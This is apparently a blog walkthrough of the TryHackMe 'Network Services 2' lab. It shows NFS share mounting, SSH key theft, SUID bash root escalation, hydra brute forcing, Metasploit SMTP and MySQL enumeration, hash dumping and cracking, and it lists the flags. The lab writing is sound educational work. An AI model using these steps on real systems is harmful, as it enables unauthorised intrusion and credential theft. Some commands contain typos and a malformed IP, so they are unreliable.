---
title: "TryHackMe: Network Services 2"
description: Enumerating and Exploiting More Common Network Services & Misconfigurations
date: 2024-05-31 22:50:00 -0500
categories:
  - Security
  - TryHackMe
tags:
  - security
  - tryhackme
  - walkthrough
  - networking
  - ctf
published: true
media_subpath: /assets/
---

![[thm-network-services-2-banner.png|640]]

Cover Image by [BiZkettE1](https://www.freepik.com/free-vector/modern-business-background-with-geometric-shapes_5287944.htm) on Freepik

[TryHackMe - Network Services 2](https://tryhackme.com/r/room/networkservices2)

In this room, we will learn about NFS, SMTP and MySQL. We will also explore how we can enumerate these services and exploit them in CTFs.

> [!INFO]  
> It is strongly recommended to go through the reading material that accompanies each task before reading this guide. This article will only include the content necessary to answer the questions.

## NFS

### Task 2: Understanding NFS

![[ns2-nfs-1.png|640]]

**1. What does NFS stand for?**

> Network File System

**2. What process allows an NFS client to interact with a remote directory as though it were a physical device?**

> Mounting

![[ns2-nfs-2.png|460]]

**3. What does NFS use to represent files and directories on the server?**

> File Handle

**4. What protocol does NFS use to communicate between the server and client?**

> RPC

**5. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2**

> User ID /Group ID

![[ns2-nfs-3.png|640]]

**6. Can a Windows NFS server share files with a Linux client? (Y/N)**

> Y

**7. Can a Linux NFS server share files with a MacOS client? (Y/N)**

> Y

**8. What is the latest version of NFS? \[released in 2016, but is still up to date as of 2020\] This will require external research.**

![[ns2-nfs-4.png|640]]

[Network File System - Wikipedia](https://en.wikipedia.org/wiki/Network_File_System#NFSv4)

> 4.2

### Task 3: Enumerating NFS

**1. Conduct a thorough port scan of your choosing, how many ports are open?**

```bash
sudo nmap -sS -T4 -A -p- 10.10.12.248 -oN nmap_nfs.txt
```

`-sS`: Stealth Scan (Uses partial TCP handshake)  
`-A`: Aggressive Scan (Service Versioning, OS Detection and Default Nmap Scripts)  
`-T4`: Timing Template (Aggressive) - Faster Scan  
`-p-`: Scan all 65,535 ports  
`-oN`: Save result as Text (Normal Output)

![[ns2-nfs-5.png|500]]

![[ns2-nfs-6.png|500]]

> 7

**2. Which port contains the service we're looking to enumerate?**

> 2049

**3. Now, use “/usr/sbin/showmount -e \[IP\] to list the NFS shares, what is the name of the visible share?**

```bash
/usr/sbin/showmount -e 10.10.12.248
```

![[ns2-nfs-7.png|380]]

> /home

**4. Use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the “/tmp” directory so be aware that it will be removed on restart.  
Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change the directory to where you mounted the share- what is the name of the folder inside?**

```bash
mkdir /tmp/home && sudo mount -t nfs 10.10.12.248:home /tmp/home -nolock
```

![[ns2-nfs-8.png|460]]

> cappucino

**5. Have a look inside this directory, look at the files. Looks like we're inside a user's home directory**

> No answer required

**6. Interesting! Let's do a bit of research now, and have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?**

![[ns2-nfs-9.png|440]]

> .ssh

**7. Which of these keys is most useful to us?**

![[ns2-nfs-10.png|640]]

`id_rsa.pub` contains the SSH public key while `id_rsa` contains the private key. To authenticate with the system from a remote machine we need the private key.

> id_rsa

**8. Copy this file to a different location on your local machine, and change the permissions to "600" using "chmod 600 \[file\]".  
Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.  
Can we log into the machine using: “ssh -i \<key-file\> \<username\>@\<ip\>”? (Y/N)**

```bash
# Change File Permissions
sudo chmod 600 id_rsa

# Connect using SSH
ssh cappucino@10.10.12.248 -i id_rsa
```

![[ns2-nfs-11.png|440]]

> Y

### Task 4: Exploiting NFS

**1. First, change the directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.**

Navigate to the directory on our system that contains the files related to this room. Then using SCP download the `bash` binary from the target system.

```bash
scp -i /tmp/home/cappacino/.ssh/id_rsa cappucino@10.10.12.248:/bin/bash .
```

![[ns2-nfs-12.png|460]]

> No answer required

**2. Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"**

> No answer required

Copy the downloaded `bash` binary into the home directory of the user `cappucino`. Using `chown` change the owner to `root`.

```bash
# Copy Binary to Cappucino Home Directory
cp ~/Security/tryhackme/network_services_2/bash .

# Change File Owner
sudo chown root:root bash
```

![[ns2-nfs-13.png|450]]

**3. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +\[permission\] bash". What letter do we use to set the SUID bit set using chmod?**

```bash
sudo chmod +s bash
```

SUID is a special permission that can be assigned to files. Files that have this flag set are executed with the permissions of the owner instead of the permissions of the current user.

> s

**4. Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.**

> -rwsr-sr-x

**5. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Let us run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.**

```bash
./bash -p
```

`-p`: Persist Permissions

![[ns2-nfs-14.png|640]]

> No answer required

**6. Great! If all's gone well you should have a shell as root! What's the root flag?**

> THM{nfs_got_pwned}

## SMTP

### Task 5: Understanding SMTP

![[ns2-smtp-1.png|640]]

**1. What does SMTP stand for?**

> Simple Mail Transfer Protocol

**2. What does SMTP handle the sending of? (answer in plural)**

> Emails

![[ns2-smtp-3.png|640]]

**3. What is the first step in the SMTP process?**

> SMTP Handshake

**4. What is the default SMTP port?**

> 25

**5. Where does the SMTP server send the email if the recipient's server is not available?**

> SMTP Queue

![[ns2-smtp-2.png|640]]

**6. On what server does the Email ultimately end up?**

> POP/IMAP

![[ns2-smtp-4.png|560]]

**7. Can a Linux machine run an SMTP server? (Y/N)**

> Y

**8. Can a Windows machine run an SMTP server? (Y/N)**

> Y

### Task 6: Enumerating SMTP

**1. First, let us run a port scan against the target machine, the same as last time. What port is SMTP running on?**

```bash
sudo nmap -sS -T4 -A -p- 10.10.98.49 -oN nmap_smtp.txt
```

![[ns2-smtp-5.png|540]]

> 25

**2. Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?**

![[ns2-smtp-6.png|640]]

> msfconsole

**3. Let's search for the module "smtp_version", what's its full module name?**

```bash
search smtp_version
```

> auxiliary/scanner/smtp/smtp_version

**4. Great, now select the module and list the options. How do we do this?**

![[ns2-smtp-7.png|640]]

```bash
use 0
show options
```

> options

**5. Have a look through the options, does everything seem correct? What is the option we need to set?**

```bash
set RHOSTS 10.10.98.49
```

> RHOSTS

**6. Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?**

> polosmtp.home

**7. What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.**

> Postfix

**8. Good! We've now got a good amount of information on the target system to move on to the next stage. Let's search for the module "smtp_enum", what's its full module name?**

![[ns2-smtp-8.png|640]]

```bash
search smtp_enum
```

> auxiliary/scanner/smtp/smtp_enum

![[ns2-smtp-9.png|640]]

**9. We're going to be using the _"top-usernames-shortlist.txt"_ wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).  
What option do we need to set to the wordlist's path?**

```bash
use 0
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

> USER_FILE

**10. Once we've set this option, what are the other essential parameters we need to set?**

```bash
set RHOSTS 10.10.98.49
run
```

> RHOSTS

**11. Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, or water. Keep yourself hydrated!**

> No answer required

**12. Okay! Now that's finished, what username is returned?**

> administrator

### Task 7: Exploiting SMTP

**1. What is the password of the user we found during our enumeration stage?**

![[ns2-smtp-10.png|640]]

```bash
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt -f -v 10.10.98.49 ssh
```

`-t`: No. of Parallel Tasks  
`-l`: Login Name  
`-P`: Password List (Wordlist)  
`-f`: Exit when valid credentials are found  
`-v`: Verbose Mode  

> alejandro

**2. Great! Now, let's SSH into the server as the user, what are the contents of smtp.txt**

```bash
ssh administrator@10.10.98.49
```

![[ns2-smtp-11.png|540]]

> THM{who_knew_email_servers_were_c00l?}

## MySQL

### Task 8: Understanding MySQL

![[ns2-mysql-1.png|640]]

**1. What type of software is MySQL?**

> Relational Database Management System

**2. What language is MySQL based on?**

> SQL

![[ns2-mysql-2.png|640]]

**3. What communication model does MySQL use?**

> Client-Server

**4. What is a common application of MySQL?**

> Back end Database

**5. What major social network uses MySQL as their back-end database? This will require further research.**

![[ns2-mysql-3.png|540]]

[Do any social media applications use SQL databases? If yes, what are they?](https://www.quora.com/Do-any-social-media-applications-use-SQL-databases-e-g-Facebook-Twitter-Instagram-etc-If-yes-what-are-they)

> Facebook

### Task 9: Enumerating MySQL

**1. As always, let's start with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?**

```bash
sudo nmap -sS -T4 -A -p- 10.10.1091.66 -oN nmap_mysql.txt
```

![[ns2-mysql-4.png|640]]

> 3306

**2. Good, now we think we have a set of credentials. Let's double-check that by manually connecting to the MySQL server. We can do this using the command "mysql -h \[IP\] -u \[username\] -p"**

```bash
mysql -h 10.10.199.166 -u root -p
```

![[ns2-mysql-5.png|440]]

> No answer required

**3. Okay, we know that our login credentials work. Let us quit out of this session with "exit" and launch up Metasploit.**

> No answer required

**4. We're going to be using the "mysql_sql" module.  
Search for, select and list the options it needs. What three options do we need to set? (in descending order).**

```bash
# Search Module
search mysql_sql
# Select Module
use 0
# View Module Options
show options
```

![[ns2-mysql-6.png|640]]

> PASSWORD/RHOSTS/USERNAME

**5. Run the exploit. By default, it will test with the "select version()" command, what result does this give you?**

```bash
set PASSWOR password
set RHOSTS 10.10.199.166
set USERNAME root
```

![[ns2-mysql-7.png|440]]

> 5.7.29-0ubuntu0.18.04.1

**6. Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". How many databases are returned?**

```bash
set SQL "show databases"
run
```

![[ns2-mysql-8.png|440]]

> 4

### Task 10: Exploiting MySQL

**1. First, let's search for and select the "mysql_schemadump" module. What's the module's full name?**

![[ns2-mysql-9.png|600]]

```bash
search mysql_schemadump
use 0
show options
```

> auxiliary/scanner/mysql/mysql_schemadump

**2. Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, and run the exploit. What's the name of the last table that gets dumped?**

```bash
set PASSWOR password
set RHOSTS 10.10.109.166
set USERNAME root

run
```

![[ns2-mysql-10.png|600]]

![[ns2-mysql-11.png|300]]

> x$waits_global_by_latency

**3. Awesome, you have now dumped the tables and column names of the whole database. But we can do one better. Search for and select the "mysql_hashdump" module. What's the module's full name?**

![[ns2-mysql-12.png|540]]

```bash
search musql_hashdump
use 0
```

> auxiliary/scanner/mysql/mysql_hashdump

**4. Again, I'll let you take it from here. Set the relevant options, and run the exploit. What non-default user stands out to you?**

```bash
set PASSWOR password
set RHOSTS 10.10.109.166
set USERNAME root

run
```

![[ns2-mysql-13.png|560]]

> carl

**5. Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:HASH to a text file on your local machine called "hash.txt".  
What is the user/hash combination string?**

![[ns2-mysql-14.png|520]]

```bash
echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
```

> carl:\*EA031893AA21444B170FC2162A56978B8CEECE18

**6. Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt". What is the password of the user we found?**

> doggie

**7. Awesome. Password reuse is not only extremely dangerous but also extremely common. What are the chances that this user has reused their password for a different service?  
What's the contents of MySQL.txt**

```bash
ssh carl@10.10.199.166
```

![[ns2-mysql-15.png|400]]

> THM{congratulations_you_got_the_mySQL_flag}
